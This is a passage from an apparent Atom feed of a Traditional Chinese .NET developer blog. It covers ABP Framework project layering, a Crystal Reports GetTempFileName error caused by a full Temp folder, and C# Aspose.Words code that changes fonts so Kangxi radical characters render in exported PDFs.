Relation"></p><p>但是，ABP template 方案中，還有其他的專案，它們又是做什麼的呢?</p><p>1.HttpApi<br>使用 ABP 的 <a href="https://github.com/ABPframework/ABP/blob/dev/docs/en/API/Auto-API-Controllers.md" target="_blank" rel="noopener">Auto API Controllers</a> 功能，依 Application.Contracts 專案中定義的 service interface 自動建立 API Controller</p><p>2.HttpApi.Client<br>使用 ABP 的 <a href="https://github.com/ABPframework/ABP/blob/dev/docs/en/API/Dynamic-CSharp-API-Clients.md" target="_blank" rel="noopener">Dynamic C# API Clients</a> 功能，封裝 Application.Contracts 專案中定義的 service interface ，讓 application 或是其他 .NET client 可以很容易的使用，它則會自動去 call 我們的 HTTP API，並 Handle Retry，不需要我們自已去建立 HttpClient 呼叫 API</p><p>加進 HttpApi 及 HttpApi.Client，ABP template 各專案的關連就如下圖，<br><img src="/2022/11/17/abp-structuring-solution-ddd/05.png" title="ABP Projects Relation 2"></p><p>3.DbMigrator<br>參考 Application.Contracts 專案及 EntityFrameworkCore 專案，來建立資料庫(如果需要)，執行 database migrations 及 seeds initial data(如果需要)的 Console 程式</p><p>但是查看 Web 專案，為什麼它的專案相依性卻是 Application 專案 及 EntityFrameworkCore 專案呢?<br><img src="/2022/11/17/abp-structuring-solution-ddd/06.png" title="Web Project Refs"></p><p>雖然在整個 Web 專案的 Page 程式中並沒有使用到，<br>但因為 Web 專案在執行時，需要 Application 專案 及 EntityFrameworkCore 專案，<br>所以才將它們加入參考。</p><p>當然，如果覺得這樣子不 OK， Web 專案應該只需要參考 Application.Contracts 專案。<br>則可以參考 <a href="https://github.com/PacktPublishing/Mastering-ABP-Framework/tree/main/Samples/Chapter-09/SeparateHosting" target="_blank" rel="noopener">SeparateHosting example</a> ，新增一個 Web.Host 的專案，加入執行時需要的 Application 專案、 EntityFrameworkCore 專案、 HttpApi 專案及 Web 專案參考，而 Web 專案則改只參考 Application.Contracts 專案。</p><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://github.com/ABPframework/ABP/blob/dev/docs/en/Startup-Templates/Application.md" target="_blank" rel="noopener">Application Startup Template</a><br><a href="https://dzone.com/articles/onion-architecture-is-interesting" target="_blank" rel="noopener">Onion Architecture Is Interesting</a><br><a href="https://github.com/PacktPublishing/Mastering-ABP-Framework/tree/main/Samples/Chapter-09/SeparateHosting" target="_blank" rel="noopener">ABP SeparateHosting example</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;ABP Framework 的 Template 方案，是依 Domain-Driven Design (DDD) 原則去實現分層應用，&lt;b
      
    
    </summary>
    
    
      <category term="ABP" scheme="https://rainmakerho.github.io/tags/ABP/"/>
    
      <category term="ABP Framework" scheme="https://rainmakerho.github.io/tags/ABP-Framework/"/>
    
      <category term="DDD" scheme="https://rainmakerho.github.io/tags/DDD/"/>
    
  </entry>
  
  <entry>
    <title>C# System.IO.Path.GetTempFileName 會產生 IOException 檔案存在(The file exists)的錯誤</title>
    <link href="https://rainmakerho.github.io/2022/11/15/Path-GetTempFileName-IOException-The-file-exists/"/>
    <id>https://rainmakerho.github.io/2022/11/15/Path-GetTempFileName-IOException-The-file-exists/</id>
    <published>2022-11-15T07:24:30.000Z</published>
    <updated>2022-11-18T00:56:14.005Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近收到一個 Crystal Report 匯出 PDF 檔案，然後給 Client 下載。<br>平常運作都正常，最近才出現 <strong>System.IO.IOException: 檔案存在。</strong>的錯誤。</p><p>詳細錯誤訊息如下，</p><blockquote><p>於 System.IO.<strong>Error.WinIOError(Int32 errorCode, String maybeFullPath)<br>於 System.IO.</strong>Error.WinIOError()<br>於 System.IO.Path.InternalGetTempFileName(Boolean checkHost)<br>於 System.IO.Path.GetTempFileName()<br>於 CrystalDecisions.ReportSource.EromReportSourceBase.ExportToStream(ExportRequestContext reqContext)<br>於 CrystalDecisions.CrystalReports.Engine.FormatEngine.ExportToStream(ExportRequestContext reqContext)<br>於 CrystalDecisions.CrystalReports.Engine.ReportDocument.ExportToStream(ExportOptions options)<br>於 CrystalDecisions.CrystalReports.Engine.ReportDocument.ExportToHttpResponse(ExportOptions options, HttpResponse response, Boolean asAttachment, String attachmentName)<br>於 CrystalDecisions.CrystalReports.Engine.ReportDocument.ExportToHttpResponse(ExportFormatType formatType, HttpResponse response, Boolean asAttachment, String attachmentName)<br>於 CRViewer.ExportPDF(String RptName)</p></blockquote><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>Crystal Report 的程式碼蠻簡單的，如下，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.Response.ContentType = <span class="string">"application/pdf"</span>;</span><br><span class="line">rptDoc.ExportToHttpResponse(ExportFormatType.PortableDocFormat, <span class="literal">true</span>, <span class="keyword">this</span>.Response, <span class="literal">true</span>, <span class="string">"報表名稱"</span>);</span><br><span class="line"><span class="keyword">this</span>.Response.Flush()</span><br><span class="line"><span class="keyword">this</span>.Response.End();</span><br></pre></td></tr></table></figure><p><code>System.IO.Path.GetTempFileName()</code> 應該是不會發生錯誤呀~<br>除非是權限不足。<br>但… 之前卻是可以的… 於是再 Search 看看有沒有相似的錯誤…<br>結果真的找到 <a href="https://stackoverflow.com/questions/50906117/crystal-report-file-exists-error" target="_blank" rel="noopener">Crystal Report - File Exists Error</a> 感覺是一樣的問題。</p><blockquote><p>This exception is documented in .NET and is raised when the temp directory reaches the limit of 65535 files.<br>這個問題是因為 Temp 目錄達到限制的 <strong>65,535</strong> 個檔案所引發的錯誤。</p></blockquote><p>在 <a href="https://learn.microsoft.com/zh-tw/dotnet/api/system.io.path.gettempfilename?view=netframework-4.8" target="_blank" rel="noopener">Path.GetTempFileName 方法</a> 有說明</p><blockquote><p>如果方法用來建立超過 65535 個檔案，而不刪除先前的暫存檔案，則 GetTempFileName 此方法會引發 IOException</p></blockquote><p>再來就是檢查 Temp 目錄中是否真的超出 65,535 個檔案，<br>結果同事回答是 65,734 個，<br>所以就請同事將檔案刪少於 65,535 再試試看，就沒有問題了。</p><p>註: Temp 目錄的路徑是 環境變數 ，系統變數(S) 中的 TEMP 的設定值(檔案總管中，在”本機”上按右鍵，選”內容”，在右邊”關於”下方，點選”進階系統設定”)<br><img src="/2022/11/15/Path-GetTempFileName-IOException-The-file-exists/01.png" title="環境變數"></p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://github.com/microsoft/azure-pipelines-agent/issues/2305" target="_blank" rel="noopener">System.IO.IOException: The file exists</a><br><a href="https://stackoverflow.com/questions/50906117/crystal-report-file-exists-error" target="_blank" rel="noopener">Crystal Report - File Exists Error</a><br><a href="https://learn.microsoft.com/zh-tw/dotnet/api/system.io.path.gettempfilename?view=netframework-4.8" target="_blank" rel="noopener">Path.GetTempFileName 方法</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近收到一個 Crystal Report 匯出 PDF 檔案，然後給 Client 下載。&lt;br&gt;平常運作都正常，最近才出現 &lt;stron
      
    
    </summary>
    
    
      <category term=".NET" scheme="https://rainmakerho.github.io/tags/NET/"/>
    
      <category term="GetTempFileName" scheme="https://rainmakerho.github.io/tags/GetTempFileName/"/>
    
      <category term="IOException" scheme="https://rainmakerho.github.io/tags/IOException/"/>
    
      <category term="CrystalReports" scheme="https://rainmakerho.github.io/tags/CrystalReports/"/>
    
      <category term="ExportToHttpResponse" scheme="https://rainmakerho.github.io/tags/ExportToHttpResponse/"/>
    
      <category term="檔案存在" scheme="https://rainmakerho.github.io/tags/%E6%AA%94%E6%A1%88%E5%AD%98%E5%9C%A8/"/>
    
      <category term="The file exists" scheme="https://rainmakerho.github.io/tags/The-file-exists/"/>
    
      <category term="65535" scheme="https://rainmakerho.github.io/tags/65535/"/>
    
  </entry>
  
  <entry>
    <title>標楷體(DFKai-SB)的Word檔中有些字透過 Aspose.Words 另存成 PDF 後，會變成&quot;空白&quot;字</title>
    <link href="https://rainmakerho.github.io/2022/11/15/aspose-kangxi-radical-dfkai-sb-pdf-square-box/"/>
    <id>https://rainmakerho.github.io/2022/11/15/aspose-kangxi-radical-dfkai-sb-pdf-square-box/</id>
    <published>2022-11-15T03:43:15.000Z</published>
    <updated>2022-11-15T06:23:37.551Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>標楷體的 Word 文件中有些 Unicode 透過 Aspose.Words 另存成 PDF 時，該字會變成”空白字”，<br>例如 <a href="https://unicode-table.com/en/2FA6/" target="_blank" rel="noopener">U+2FA6(⾦)</a> 這個字，可是在 Word 中明明可以正常顯示。<br>我們可以參考 <a href="https://rainmakerho.github.io/2022/11/15/aspose-kangxi-radical-word-2-pdf-square-box/">有些字透過 Aspose.Words 讀取 Word 檔，另存成 PDF 後，會變成空白框(square box)是變成 空白字</a> 將 Word 內容轉成 「<strong>Microsoft YaHei</strong>」字型後，<br>再另存成 PDF 就可以解決 <a href="https://unicode-table.com/en/2FA6/" target="_blank" rel="noopener">U+2FA6(⾦)</a> 無法在 PDF 中顯示的問題。<br>但是，如果我的字型一定要<strong>標楷體(DFKai-SB)</strong>，要怎麼辦呢?</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>測試的 C# 程式如下(請先加入 Aspose.Words 套件)，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docxPath = <span class="string">@"c:\temp\h2docx.docx"</span>;</span><br><span class="line"><span class="keyword">var</span> pdfPath = <span class="string">@"c:\temp\h2pdf.pdf"</span>;</span><br><span class="line"><span class="keyword">var</span> doc = <span class="keyword">new</span> Aspose.Words.Document(docxPath);</span><br><span class="line"><span class="keyword">var</span> fontChanger = <span class="keyword">new</span> FontChanger(<span class="string">"DFKai-SB"</span>);</span><br><span class="line">doc.Accept(fontChanger);</span><br><span class="line">doc.Save(pdfPath);</span><br></pre></td></tr></table></figure><p>將字型全改成<strong>標楷體(DFKai-SB)</strong>，在 PDF 中還是變成一個空白，<br><img src="/2022/11/15/aspose-kangxi-radical-dfkai-sb-pdf-square-box/01.png" title="square box in pdf"></p><p>查看 <a href="https://www.fileformat.info/info/unicode/font/dfkai-sb/list.htm" target="_blank" rel="noopener">Unicode characters supported by the 標楷體 font</a> ，<br>裡面的確找不到 <a href="https://unicode-table.com/en/2FA6/" target="_blank" rel="noopener">⾦</a>，<br>所以要找到有包含 <a href="https://unicode-table.com/en/2FA6/" target="_blank" rel="noopener">⾦</a> 的字型檔案，<br>同時要像 <strong>標楷體(DFKai-SB)</strong> 的字型。</p><p>…</p><p>後來筆者找到了 <a href="https://data.gov.tw/dataset/5961" target="_blank" rel="noopener">CNS11643 中文標準交換碼全字庫</a>，<br><img src="/2022/11/15/aspose-kangxi-radical-dfkai-sb-pdf-square-box/03.png" title="全字庫"></p><p>裡面就包含了 <strong>全字庫正楷體</strong>(TW-Kai-98_1.ttf)，就跟 <strong>標楷體(DFKai-SB)</strong> 長的蠻像的。<br>下載 ZIP 檔案後，解壓縮後，開啟 Open_Data\Fonts 目錄，<br>DBClick TW-Kai-98_1.ttf ，按下 <strong>「安裝(I)」</strong> 將字型安裝到系統之中。<br><img src="/2022/11/15/aspose-kangxi-radical-dfkai-sb-pdf-square-box/04.png" title="安裝全字庫"></p><p>在 Word 中， Copy 一份內容，改用 <strong>全字庫正楷體</strong> 來比較一下，<br>可以發現跟<strong>標楷體(DFKai-SB)</strong>差不多，而且在 PDF 中也可以正常顯示 <a href="https://unicode-table.com/en/2FA6/" target="_blank" rel="noopener">⾦</a>，<br>測試程式如下，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docxPath = <span class="string">@"c:\temp\h2docx.docx"</span>;</span><br><span class="line"><span class="keyword">var</span> pdfPath = <span class="string">@"c:\temp\h2pdf.pdf"</span>;</span><br><span class="line"><span class="keyword">var</span> doc = <span class="keyword">new</span> Aspose.Words.Document(docxPath);</span><br><span class="line">doc.Save(pdfPath);</span><br></pre></td></tr></table></figure><img src="/2022/11/15/aspose-kangxi-radical-dfkai-sb-pdf-square-box/02.png" title="標楷體與全字庫正楷體"><p>即然使用<strong>全字庫正楷體</strong>字型另存成 PDF 沒問題，那就將 Word 所有文字的字體改成 <strong>全字庫正楷體</strong> ，再另存就可以了。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docxPath = <span class="string">@"c:\temp\h2docx.docx"</span>;</span><br><span class="line"><span class="keyword">var</span> pdfPath = <span class="string">@"c:\temp\h2pdf.pdf"</span>;</span><br><span class="line"><span class="keyword">var</span> doc = <span class="keyword">new</span> Aspose.Words.Document(docxPath);</span><br><span class="line"><span class="keyword">var</span> fontChanger = <span class="keyword">new</span> FontChanger(<span class="string">"全字庫正楷體"</span>);</span><br><span class="line">doc.Accept(fontChanger);</span><br><span class="line">doc.Save(pdfPath);</span><br></pre></td></tr></table></figure><img src="/2022/11/15/aspose-kangxi-radical-dfkai-sb-pdf-square-box/05.png" title="全字庫正楷體PDF"><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://rainmakerho.github.io/2022/11/15/aspose-kangxi-radical-word-2-pdf-square-box/">有些字透過 Aspose.Words 讀取 Word 檔，另存成 PDF 後，會變成空白框(square box)是變成 空白字</a><br><a href="https://data.gov.tw/dataset/5961" target="_blank" rel="noopener">CNS11643 中文標準交換碼全字庫</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;標楷體的 Word 文件中有些 Unicode 透過 Aspose.Words 另存成 PDF 時，該字會變成”空白字”，&lt;br&gt;例如 &lt;a
      
    
    </summary>
    
    
      <category term="PDF" scheme="https://rainmakerho.github.io/tags/PDF/"/>
    
      <category term="Aspose" scheme="https://rainmakerho.github.io/tags/Aspose/"/>
    
      <category term="DFKai-SB" scheme="https://rainmakerho.github.io/tags/DFKai-SB/"/>
    
      <category term="Word" scheme="https://rainmakerho.github.io/tags/Word/"/>
    
      <category term="空白框" scheme="https://rainmakerho.github.io/tags/%E7%A9%BA%E7%99%BD%E6%A1%86/"/>
    
      <category term="square box" scheme="https://rainmakerho.github.io/tags/square-box/"/>
    
      <category term="kangxi radical" scheme="https://rainmakerho.github.io/tags/kangxi-radical/"/>
    
      <category term="unicode" scheme="https://rainmakerho.github.io/tags/unicode/"/>
    
      <category term="空白字" scheme="https://rainmakerho.github.io/tags/%E7%A9%BA%E7%99%BD%E5%AD%97/"/>
    
      <category term="標楷體" scheme="https://rainmakerho.github.io/tags/%E6%A8%99%E6%A5%B7%E9%AB%94/"/>
    
      <category term="全字庫" scheme="https://rainmakerho.github.io/tags/%E5%85%A8%E5%AD%97%E5%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>有些字透過 Aspose.Words 讀取 Word 檔，另存成 PDF 後，會變成空白框(square box)或是變成 空白字</title>
    <link href="https://rainmakerho.github.io/2022/11/15/aspose-kangxi-radical-word-2-pdf-square-box/"/>
    <id>https://rainmakerho.github.io/2022/11/15/aspose-kangxi-radical-word-2-pdf-square-box/</id>
    <published>2022-11-15T01:41:59.000Z</published>
    <updated>2022-11-15T05:23:29.401Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>有些情況在透過 Aspose.Words 另存成 PDF 檔後，<br>有些字在 PDF 中會變成 空白框(square box) 或是變成 空白，<br>但那些字又不自造字，怎麼會這樣子呢?<br>例如，<a href="https://unicode-table.com/en/2FA6/" target="_blank" rel="noopener">U+2FA6(⾦)</a> 這個字，可是在 Word 中明明可以正常顯示。<br><img src="/2022/11/15/aspose-kangxi-radical-word-2-pdf-square-box/01.png" title="square box in pdf"></p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>測試的 C# 程式如下(請先加入 Aspose.Words 套件)，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docxPath = <span class="string">@"c:\temp\h2docx.docx"</span>;</span><br><span class="line"><span class="keyword">var</span> pdfPath = <span class="string">@"c:\temp\h2pdf.pdf"</span>;</span><br><span class="line"><span class="keyword">var</span> doc = <span class="keyword">new</span> Aspose.Words.Document(docxPath);</span><br><span class="line">doc.Save(pdfPath);</span><br></pre></td></tr></table></figure><p>Word 檔 及 另存的 PDF 如上圖所示，<br>從 Word 檔中可以發現字型是使用「<strong>Times New Roman</strong>」，<br>有同事說，如果是 「<strong>Microsoft YaHei</strong>」 字型，在 PDF 中顯示似乎是正常的。</p><p>那…<br>我們要如何將 Word 中的字型全都改成 「<strong>Microsoft YaHei</strong>」 呢?</p><p>這時，我們可以透過 <a href="https://reference.aspose.com/words/net/aspose.words/document/accept/" target="_blank" rel="noopener">Document.Accept Method</a> 透過 <a href="https://reference.aspose.com/words/net/aspose.words/documentvisitor/" target="_blank" rel="noopener">DocumentVisitor</a> 將字型全都改成 「<strong>Microsoft YaHei</strong>」。<br>所以先新增一個繼承自 <a href="https://reference.aspose.com/words/net/aspose.words/documentvisitor/" target="_blank" rel="noopener">DocumentVisitor</a> 的 FontChanger Class，<br>來將字型改成 「<strong>Microsoft YaHei</strong>」。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FontChanger</span> : <span class="title">DocumentVisitor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="keyword">string</span> _NewFont = <span class="string">"DFKai-SB"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FontChanger</span>(<span class="params"><span class="keyword">string</span> newFont</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _NewFont = newFont;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> VisitorAction <span class="title">VisitFieldEnd</span>(<span class="params">FieldEnd fieldEnd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//Simply change font name</span></span><br><span class="line">        ResetFont(fieldEnd.Font);</span><br><span class="line">        <span class="keyword">return</span> VisitorAction.Continue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> VisitorAction <span class="title">VisitFieldSeparator</span>(<span class="params">FieldSeparator fieldSeparator</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ResetFont(fieldSeparator.Font);</span><br><span class="line">        <span class="keyword">return</span> VisitorAction.Continue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> VisitorAction <span class="title">VisitFieldStart</span>(<span class="params">FieldStart fieldStart</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ResetFont(fieldStart.Font);</span><br><span class="line">        <span class="keyword">return</span> VisitorAction.Continue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> VisitorAction <span class="title">VisitFootnoteEnd</span>(<span class="params">Footnote footnote</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ResetFont(footnote.Font);</span><br><span class="line">        <span class="keyword">return</span> VisitorAction.Continue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> VisitorAction <span class="title">VisitFormField</span>(<span class="params">FormField formField</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ResetFont(formField.Font);</span><br><span class="line">        <span class="keyword">return</span> VisitorAction.Continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> VisitorAction <span class="title">VisitParagraphEnd</span>(<span class="params">Paragraph paragraph</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ResetFont(paragraph.ParagraphBreakFont);</span><br><span class="line">        <span class="keyword">return</span> VisitorAction.Continue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> VisitorAction <span class="title">VisitRun</span>(<span class="params">Run run</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ResetFont(run.Font);</span><br><span class="line">        <span class="keyword">return</span> VisitorAction.Continue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> VisitorAction <span class="title">VisitSpecialChar</span>(<span class="params">SpecialChar specialChar</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ResetFont(specialChar.Font);</span><br><span class="line">        <span class="keyword">return</span> VisitorAction.Continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ResetFont</span>(<span class="params">Aspose.Words.Font font</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        font.Name = _NewFont;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再來就是新增 FontChanger ，並呼叫 <a href="https://reference.aspose.com/words/net/aspose.words/document/accept/" target="_blank" rel="noopener">Document.Accept Method</a>，如下，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docxPath = <span class="string">@"c:\temp\h2docx.docx"</span>;</span><br><span class="line"><span class="keyword">var</span> pdfPath = <span class="string">@"c:\temp\h2pdf.pdf"</span>;</span><br><span class="line"><span class="keyword">var</span> doc = <span class="keyword">new</span> Aspose.Words.Document(docxPath);</span><br><span class="line"><span class="keyword">var</span> fontChanger= <span class="keyword">new</span> FontChanger(<span class="string">"Microsoft YaHei"</span>);</span><br><span class="line">doc.Accept(fontChanger);</span><br><span class="line">doc.Save(pdfPath);</span><br></pre></td></tr></table></figure><p>透過 FontChanger 將 Word 檔中的字型全換成 「<strong>Microsoft YaHei</strong>」 後，<br>再另存 PDF 檔後， <strong>U+2FA6(⾦)</strong> 這個字，也可以正常顯示了。</p><img src="/2022/11/15/aspose-kangxi-radical-word-2-pdf-square-box/02.png" title="square box in pdf"><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://unicode-table.com/en/2FA6/" target="_blank" rel="noopener">U+2FA6(⾦)</a><br><a href="https://www.fileformat.info/info/unicode/font/dfkai-sb/list.htm" target="_blank" rel="noopener">標楷體支援的 Unicode</a><br><a href="https://forum.aspose.com/t/word-kangxi-aspose-words-pdf/254888" target="_blank" rel="noopener">Word 檔中有 Kangxi 字，透過 Aspose.Words 另存成 PDF，該字無法呈現</a><br><a href="https://reference.aspose.com/words/net/aspose.words/document/accept/" target="_blank" rel="noopener">Document.Accept Method</a><br><a href="https://reference.aspose.com/words/net/aspose.words/documentvisitor/" target="_blank" rel="noopener">DocumentVisitor</a><br><a href="https://forum.aspose.com/t/change-text-font-of-whole-document-using-c/209319/2" target="_blank" rel="noopener">Change text font of whole document using C#</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;有些情況在透過 Aspose.Words 另存成 PDF 檔後，&lt;br&gt;有些字在 PDF 中會變成 空白框(square box) 或是變成
      
    
    </summary>
    
    
      <category term="PDF" scheme="https://rainmakerho.github.io/tags/PDF/"/>
    
      <category term="Aspose" scheme="https://rainmakerho.github.io/tags/Aspose/"/>
    
      <category term="Word" scheme="https://rainmakerho.github.io/tags/Word/"/>
    
      <category term="空白框" scheme="https://rainmakerho.github.io/tags/%E7%A9%BA%E7%99%BD%E6%A1%86/"/>
    
      <category term="square box" scheme="https://rainmakerho.github.io/tags/square-box/"/>
    
      <category term="kangxi radical" scheme="https://rainmakerho.github.io/tags/kangxi-radical/"/>
    
      <category term="unicode" scheme="https://rainmakerho.github.io/tags/unicode/"/>
    
  </entry>
  
  <entry>
    <title>有些字透過 Aspose.Words 轉成 PDF 後，會變成空白框(square box)或是變成 空白字</title>
    <link href="https://rainmakerho.github.io/2022/11/15/aspose-kangxi-radical-html-pdf-square-box/"/>
    <id>https://rainmakerho.github.io/2022/11/15/aspose-kangxi-radical-html-pdf-square-box/</id>
    <published>2022-11-15T00:55:54.000Z</published>
    <updated>2022-11-15T05:23:27.589Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>有些情況在透過 Aspose.Words 另存成 PDF 檔後，<br>有些字在 PDF 中會變成 空白框(square box) 或是變成 空白，<br>但那些字又不自造字，怎麼會這樣子呢?<br>例如，<a href="https://unicode-table.com/en/2FA6/" target="_blank" rel="noopener">U+2FA6(⾦)</a> 這個字，可是在 Word 中明明可以正常顯示。<br><img src="/2022/11/15/aspose-kangxi-radical-html-pdf-square-box/01.png" title="square box in pdf"></p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>測試的 C# 程式如下(請先加入 Aspose.Words 套件)，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docxPath = <span class="string">@"c:\temp\h2docx.docx"</span>;</span><br><span class="line"><span class="keyword">var</span> pdfPath = <span class="string">@"c:\temp\h2pdf.pdf"</span>;</span><br><span class="line"><span class="keyword">var</span> doc = <span class="keyword">new</span> Aspose.Words.Document();</span><br><span class="line"><span class="keyword">var</span> docBuilder = <span class="keyword">new</span> Aspose.Words.DocumentBuilder(doc);</span><br><span class="line"><span class="keyword">var</span> html = <span class="string">@"&lt;div&gt;U+2FA6(⾦) vs U+91D1(金)&lt;/div&gt;"</span>;</span><br><span class="line">docBuilder.InsertHtml(html);</span><br><span class="line">doc.Save(docxPath);</span><br><span class="line">doc.Save(pdfPath);</span><br></pre></td></tr></table></figure><p>產生的 Word 及 PDF 如上圖所示，<br>在 Word 檔中字型使用「<strong>Times New Roman</strong>」，<br>有同事說，如果是 「<strong>Microsoft YaHei</strong>」 字型，在 PDF 中顯示似乎是正常的。</p><p>那…<br>我們要如何將字型從 「<strong>Times New Roman</strong>」 改成 「<strong>Microsoft YaHei</strong>」 呢?<br>也就是將文字加到 Word Doc 時，就將字型設定成 「<strong>Microsoft YaHei</strong>」。</p><p>這時，我們可以透過 <a href="https://reference.aspose.com/words/net/aspose.words/inodechangingcallback/nodeinserted/" target="_blank" rel="noopener">INodeChangingCallback.NodeInserted method</a> ，在將文字寫到 Word 時，把字型強迫換成 「<strong>Microsoft 